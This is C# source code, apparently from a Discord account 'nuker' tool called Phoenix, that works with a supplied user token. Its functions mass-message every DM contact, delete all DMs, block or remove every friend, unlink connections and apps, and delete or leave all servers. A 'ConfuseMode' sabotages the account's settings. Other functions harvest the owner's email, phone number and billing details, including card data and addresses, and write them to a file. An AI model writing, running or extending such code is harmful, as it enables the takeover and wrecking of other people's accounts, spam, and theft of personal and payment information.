using Newtonsoft.Json.Linq;
using System.Drawing;
using static Phoenix.Config;
using Console = Colorful.Console;

namespace Phoenix
{
    public static class User
    {
        public static void MassDM(string? token, string message)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                    Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteDMs(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/channels/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Deleted: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void BlockRelationships(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me/relationships", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/users/@me/relationships/{entry.id}", "PUT", token, $"{{\"type\":\"2\"}}");
                    Console.WriteLine($"Blocked: {entry.user.username}#{entry.user.discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void UserInformation(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me", token);
                var id = JObject.Parse(request)["id"];
                var id2 = (id == null || string.IsNullOrEmpty(id.ToString())) ? "" : id.ToString();
                var getbadges = JObject.Parse(request)["flags"];
                var getbadges2 = (getbadges == null || string.IsNullOrEmpty(getbadges.ToString())) ? "" : getbadges.ToString();
                string badges = "";
                if (getbadges2 == "1")
                    badges += "Discord Employee, ";
                if (getbadges2 == "2")
                    badges += "Partnered Guild Owner, ";
                if (getbadges2 == "4")
                    badges += "HypeSquad Events Member, ";
                if (getbadges2 == "8")
                    badges += "Bug Hunter Level 1, ";
                if (getbadges2 == "64")
                    badges += "House Bravery Member, ";
                if (getbadges2 == "128")
                    badges += "House Brilliance Member, ";
                if (getbadges2 == "256")
                    badges += "House Balance Member, ";
                if (getbadges2 == "512")
                    badges += "Early Nitro Supporter, ";
                if (getbadges2 == "16384")
                    badges += "Bug Hunter Level 2, ";
                if (getbadges2 == "131072")
                    badges += "Early Verified Bot Developer, ";
                badges = badges.TrimEnd(' ', ',');
                var email = JObject.Parse(request)["email"];
                var phone = JObject.Parse(request)["phone"];
                var bio = JObject.Parse(request)["bio"];
                var locale = JObject.Parse(request)["locale"];
                var nsfw = JObject.Parse(request)["nsfw_allowed"];
                var mfa = JObject.Parse(request)["mfa_enabled"];
                var avatarid = JObject.Parse(request)["avatar"];
                var avatarid2 = (avatarid == null || string.IsNullOrEmpty(avatarid.ToString())) ? "" : avatarid.ToString();
                string avatar;
                if (string.IsNullOrEmpty(avatarid2))
                    avatar = "N/A";
                else
                    avatar = $"https://cdn.discordapp.com/avatars/{id}/{avatarid}.webp";
                var request2 = Request.SendGet("/users/@me/settings", token);
                var theme = JObject.Parse(request2)["theme"];
                var devmode = JObject.Parse(request2)["developer_mode"];
                var status = JObject.Parse(request2)["status"];

                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine("User Information:\n");
                Console.WriteLine($"User ID: {id}\nEmail: {email}\nPhone Number: {phone}\nBiography: {bio}\nLocale: {locale}\nNSFW Allowed: {nsfw}\n2FA Enabled: {mfa}\nBadges: {badges}\nTheme: {theme}\nDeveloper Mode: {devmode}\nStatus: {status}\nAvatar: {avatar}");

                if (Request.SendGet("/users/@me/billing/payment-sources", token).Length > 2)
                {
                    Console.WriteLine("\nBilling Information:\n");
                    var request3 = Request.SendGet("/users/@me/billing/payment-sources", token);
                    var array = JArray.Parse(request3);
                    foreach (dynamic entry in array)
                    {
                        if (entry.type == "1")
                        {
                            var invalid = entry.invalid;
                            var brand = entry.brand;
                            var last4 = entry.last_4;
                            var expiresmonth = entry.expires_month;
                            var expiresyear = entry.expires_year;
                            var name = entry.billing_address["name"];
                            var address1 = entry.billing_address["line_1"];
                            var address2 = entry.billing_address["line_2"];
                            var city = entry.billing_address["city"];
                            var state = entry.billing_address["state"];
                            var country = entry.billing_address["country"];
                            var postalcode = entry.billing_address["postal_code"];
                            Console.WriteLine($"Type: Credit Card\nInvalid: {invalid}\nBrand: {brand}\nExpiration Date: {expiresmonth}/{expiresyear}\nCardholder Name: {name}\nLast 4 Digits: {last4}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                        }
                        else if (entry.type == "2")
                        {
                            var invalid = entry.invalid;
                            var name = entry.billing_address["name"];
                            var ppemail = entry.email;
                            var address1 = entry.billing_address["line_1"];
                            var address2 = entry.billing_address["line_2"];
                            var city = entry.billing_address["city"];
                            var state = entry.billing_address["state"];
                            var country = entry.billing_address["country"];
                            var postalcode = entry.billing_address["postal_code"];
                            Console.WriteLine($"Type: PayPal\nInvalid: {invalid}\nName: {name}\nEmail: {ppemail}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                        }
                    }
                }
                Console.WriteLine("\nPress any key to go back.");
                Console.ReadKey();
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ConfuseMode(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/users/@me/settings", "PATCH", token, $"{{\"locale\": \"zh-CN\",\"theme\": \"light\", \"developer_mode\": \"false\", \"message_display_compact\": \"true\", \"explicit_content_filter\": \"0\"}}");
                Sleep(Wait.Short);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ChangeTheme(string? token, string theme)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/users/@me/settings", "PATCH", token, $"{{\"theme\": \"{theme}\"}}");
                Sleep(Wait.Short);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void CreateGuild(string? token, string name)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/guilds", "POST", token, $"{{\"name\": \"{name}\"}}");
                Sleep(Wait.Short);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void RemoveConnections(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me/connections", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/users/@me/connections/{entry.type}/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Removed: {entry.type}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeauthorizeApps(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/oauth2/tokens", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/oauth2/tokens/{entry.id}", "DELETE", token);
                    Console.WriteLine("Removed: " + entry.application["name"], Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void LeaveHypeSquad(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send("/hypesquad/online", "DELETE", token);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ClearRelationships(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me/relationships", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/users/@me/relationships/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Removed: {entry.user.username}#{entry.user.discriminator}", Color.Lime);
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void LeaveDeleteGuilds(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me/guilds", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    if (entry.owner == true)
                    {
                        Request.Send($"/guilds/{entry.id}", "DELETE", token);
                        Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
                    }
                    else
                    {
                        Request.Send($"/users/@me/guilds/{entry.id}", "DELETE", token);
                        Console.WriteLine($"Left: {entry.name}", Color.Lime);
                    }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void EditProfile(string? token, string? hypesquad = null, string? bio = null, string? status = null)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                if (hypesquad == "0")
                {
                    Request.Send("/hypesquad/online", "DELETE", token);
                    Sleep(Wait.Short);
                }
                else if (hypesquad == "1")
                {
                    Request.Send("/hypesquad/online", "POST", token, $"{{\"house_id\": 1}}");
                    Sleep(Wait.Short);
                }
                else if (hypesquad == "2")
                {
                    Request.Send("/hypesquad/online", "POST", token, $"{{\"house_id\": 2}}");
                    Sleep(Wait.Short);
                }
                else if (hypesquad == "3")
                {
                    Request.Send("/hypesquad/online", "POST", token, $"{{\"house_id\": 3}}");
                    Sleep(Wait.Short);
                }
                if (!string.IsNullOrEmpty(bio))
                {
                    Request.Send("/users/@me", "PATCH", token, $"{{\"bio\": \"{bio}\"}}");
                    Sleep(Wait.Short);
                }
                if (!string.IsNullOrEmpty(status))
                {
                    Request.Send("/users/@me/settings", "PATCH", token, $"{{\"custom_status\": {{\"text\": \"{status}\"}}}}");
                    Sleep(Wait.Short);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static string GetUsername(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                string request = Request.SendGet("/users/@me", token);
                var username = JObject.Parse(request)["username"];
                var discriminator = JObject.Parse(request)["discriminator"];
                return $"{username}#{discriminator}";
            }
            catch { return "N/A"; }
        }

        public static void ExportAccount(string? token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet("/users/@me", token);
                var id = JObject.Parse(request)["id"];
                Console.ForegroundColor = Color.Yellow;
                if (File.Exists($"{id}.txt"))
                {
                    Console.WriteLine("\nThis account is already exported.");
                    Sleep(Wait.Long);
                    return;
                }
                var id2 = (id == null || string.IsNullOrEmpty(id.ToString())) ? "" : id.ToString();
                var getbadges = JObject.Parse(request)["flags"];
                var getbadges2 = (getbadges == null || string.IsNullOrEmpty(getbadges.ToString())) ? "" : getbadges.ToString();
                string badges = "";
                if (getbadges2 == "1")
                    badges += "Discord Employee, ";
                if (getbadges2 == "2")
                    badges += "Partnered Guild Owner, ";
                if (getbadges2 == "4")
                    badges += "HypeSquad Events Member, ";
                if (getbadges2 == "8")
                    badges += "Bug Hunter Level 1, ";
                if (getbadges2 == "64")
                    badges += "House Bravery Member, ";
                if (getbadges2 == "128")
                    badges += "House Brilliance Member, ";
                if (getbadges2 == "256")
                    badges += "House Balance Member, ";
                if (getbadges2 == "512")
                    badges += "Early Nitro Supporter, ";
                if (getbadges2 == "16384")
                    badges += "Bug Hunter Level 2, ";
                if (getbadges2 == "131072")
                    badges += "Early Verified Bot Developer, ";
                badges = badges.TrimEnd(' ', ',');
                var email = JObject.Parse(request)["email"];
                var phone = JObject.Parse(request)["phone"];
                var bio = JObject.Parse(request)["bio"];
                var locale = JObject.Parse(request)["locale"];
                var nsfw = JObject.Parse(request)["nsfw_allowed"];
                var mfa = JObject.Parse(request)["mfa_enabled"];
                var avatarid = JObject.Parse(request)["avatar"];
                var avatarid2 = (avatarid == null || string.IsNullOrEmpty(avatarid.ToString())) ? "" : avatarid.ToString();
                string avatar;
                if (string.IsNullOrEmpty(avatarid2))
                    avatar = "N/A";
                else
                    avatar = $"https://cdn.discordapp.com/avatars/{id}/{avatarid}.webp";
                var request2 = Request.SendGet("/users/@me/settings", token);
                var theme = JObject.Parse(request2)["theme"];
                var devmode = JObject.Parse(request2)["developer_mode"];
                var status = JObject.Parse(request2)["status"];

                File.AppendAllText($"{id}.txt", $"User Information:\nUser ID: {id}\nEmail: {email}\nPhone Number: {phone}\nBiography: {bio}\nLocale: {locale}\nNSFW Allowed: {nsfw}\n2FA Enabled: {mfa}\nBadges: {badges}\nTheme: {theme}\nDeveloper Mode: {devmode}\nStatus: {status}\nAvatar: {avatar}");

                if (Request.SendGet("/users/@me/billing/payment-sources", token).Length > 2)
                {
                    var request3 = Request.SendGet("/users/@me/billing/payment-sources", token);
                    var array = JArray.Parse(request3);
                    foreach (dynamic entry in array)
                    {
                        if (entry.type == "1")
                        {
                            var invalid = entry.invalid;
                            var brand = entry.brand;
                            var last4 = entry.last_4;
                            var expiresmonth = entry.expires_month;
                            var expiresyear = entry.expires_year;
                            var name = entry.billing_address["name"];
                            var address1 = entry.billing_address["line_1"];
                            var address2 = entry.billing_address["line_2"];
                            var city = entry.billing_address["city"];
                            var state = entry.billing_address["state"];
                            var country = entry.billing_address["country"];
                            var postalcode = entry.billing_address["postal_code"];
                            File.AppendAllText($"{id}.txt", $"\nBilling Information:\nType: Credit Card\nInvalid: {invalid}\nBrand: {brand}\nExpiration Date: {expiresmonth}/{expiresyear}\nCardholder Name: {name}\nLast 4 Digits: {last4}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                        }
                        else if (entry.type == "2")
                        {
                            var invalid = entry.invalid;
                            var name = entry.billing_address["name"];
                            var ppemail = entry.email;
                            var address1 = entry.billing_address["line_1"];
                            var address2 = entry.billing_address["line_2"];
                            var city = entry.billing_address["city"];
                            var state = entry.billing_address["state"];
                            var country = entry.billing_address["country"];
                            var postalcode = entry.billing_address["postal_code"];
                            File.AppendAllText($"{id}.txt", $"\nBilling Information:\nType: PayPal\nInvalid: {invalid}\nName: {name}\nEmail: {ppemail}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                        }
                    }
                }
                Console.WriteLine($"Saved to {id}.txt");
                Sleep(Wait.Long);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }
    }
}
